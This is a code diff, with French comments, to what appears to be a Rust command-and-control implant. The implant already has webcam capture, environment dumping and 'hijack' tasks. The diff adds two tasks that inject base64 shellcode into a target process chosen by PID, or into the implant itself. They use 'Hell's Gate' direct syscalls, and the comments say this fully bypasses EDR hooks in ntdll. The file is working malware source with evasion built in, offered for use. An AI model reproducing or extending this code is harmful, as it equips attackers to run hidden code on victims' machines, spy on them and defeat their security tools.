@@ -20,9 +20,11 @@ pub fn execute(task: &Task, agent_id: &str) -> TaskResult {
         "envdump"    => dump_env(),
         "cd"         => change_directory(payload),
         "pwd"        => print_directory(),
-        "hijack_scan"   => hijack_scan(),
-        "hijack_deploy" => hijack_deploy(payload),
-        "webcam_snap"   => webcam_snap(),
+        "hijack_scan"    => hijack_scan(),
+        "hijack_deploy"  => hijack_deploy(payload),
+        "webcam_snap"    => webcam_snap(),
+        "hellsgate"      => hellsgate_inject_cmd(payload),
+        "hellsgate_local" => hellsgate_local_cmd(payload),
         _            => (
             String::new(),
             format!("Unknown task type: {}", task.task_type),
@@ -274,6 +276,113 @@ fn webcam_snap() -> (String, String, bool) {
         (output, String::new(), true)
     } else {
         (String::new(), output, false)
+    }
+}
+
+// ─────────────────────────────────────────────────────────────
+// Hell's Gate — Direct Syscalls (bypass hooks EDR)
+// ─────────────────────────────────────────────────────────────
+
+/// hellsgate_inject_cmd — injection distante via direct syscalls
+///
+/// payload format: "<pid>:<base64_shellcode>"
+/// Exemple: "1234:AAAA..." (PID:shellcode_en_base64)
+///
+/// Cette commande bypass TOTALEMENT les hooks EDR dans ntdll.dll.
+/// Au lieu d'appeler NtAllocateVirtualMemory (hookée), on exécute
+/// directement le syscall avec le bon numéro (résolu dynamiquement).
+fn hellsgate_inject_cmd(payload: &str) -> (String, String, bool) {
+    if payload.is_empty() {
+        return (String::new(), "usage: hellsgate <pid>:<base64_shellcode>".into(), false);
+    }
+
+    // Parser le payload : "pid:shellcode_b64"
+    let parts: Vec<&str> = payload.splitn(2, ':').collect();
+    if parts.len() != 2 {
+        return (String::new(), "format: <pid>:<base64_shellcode>".into(), false);
+    }
+
+    let pid: u32 = match parts[0].parse() {
+        Ok(p) => p,
+        Err(e) => return (String::new(), format!("Invalid PID: {}", e), false),
+    };
+
+    let shellcode = match base64::Engine::decode(
+        &base64::engine::general_purpose::STANDARD,
+        parts[1],
+    ) {
+        Ok(bytes) => bytes,
+        Err(e) => return (String::new(), format!("Base64 decode error: {}", e), false),
+    };
+
+    // Résoudre la syscall table et injecter
+    unsafe {
+        let table = match crate::inject::hellsgate::resolve_syscall_table() {
+            Ok(t) => t,
+            Err(e) => return (String::new(), format!("Hell's Gate init failed: {}", e), false),
+        };
+
+        match crate::inject::hellsgate::hellsgate_inject(&table, &shellcode, pid) {
+            Ok(p) => (
+                format!(
+                    "[Hell's Gate] Shellcode injecté avec succès dans PID {}\n\
+                     Technique: Direct syscalls (bypass hooks ntdll)\n\
+                     SSN NtAllocateVirtualMemory: 0x{:04X}\n\
+                     SSN NtCreateThreadEx: 0x{:04X}",
+                    p,
+                    table.nt_allocate_virtual_memory.map(|e| e.ssn).unwrap_or(0),
+                    table.nt_create_thread_ex.map(|e| e.ssn).unwrap_or(0),
+                ),
+                String::new(),
+                true,
+            ),
+            Err(e) => (String::new(), format!("Hell's Gate inject failed: {}", e), false),
+        }
+    }
+}
+
+/// hellsgate_local_cmd — injection locale (self-injection) via direct syscalls
+///
+/// payload format: "<base64_shellcode>"
+///
+/// Exécute le shellcode dans le processus de l'agent lui-même.
+/// Utile pour charger un reflective DLL loader ou un beacon stageless.
+fn hellsgate_local_cmd(payload: &str) -> (String, String, bool) {
+    if payload.is_empty() {
+        return (String::new(), "usage: hellsgate_local <base64_shellcode>".into(), false);
+    }
+
+    let shellcode = match base64::Engine::decode(
+        &base64::engine::general_purpose::STANDARD,
+        payload,
+    ) {
+        Ok(bytes) => bytes,
+        Err(e) => return (String::new(), format!("Base64 decode error: {}", e), false),
+    };
+
+    unsafe {
+        let table = match crate::inject::hellsgate::resolve_syscall_table() {
+            Ok(t) => t,
+            Err(e) => return (String::new(), format!("Hell's Gate init failed: {}", e), false),
+        };
+
+        match crate::inject::hellsgate::hellsgate_inject_local(&table, &shellcode) {
+            Ok(()) => (
+                format!(
+                    "[Hell's Gate] Shellcode exécuté localement (self-inject)\n\
+                     Technique: Direct syscalls\n\
+                     SSN NtAllocateVirtualMemory: 0x{:04X}\n\
+                     SSN NtProtectVirtualMemory: 0x{:04X}\n\
+                     SSN NtCreateThreadEx: 0x{:04X}",
+                    table.nt_allocate_virtual_memory.map(|e| e.ssn).unwrap_or(0),
+                    table.nt_protect_virtual_memory.map(|e| e.ssn).unwrap_or(0),
+                    table.nt_create_thread_ex.map(|e| e.ssn).unwrap_or(0),
+                ),
+                String::new(),
+                true,
+            ),
+            Err(e) => (String::new(), format!("Hell's Gate local inject failed: {}", e), false),
+        }
     }
 }
 
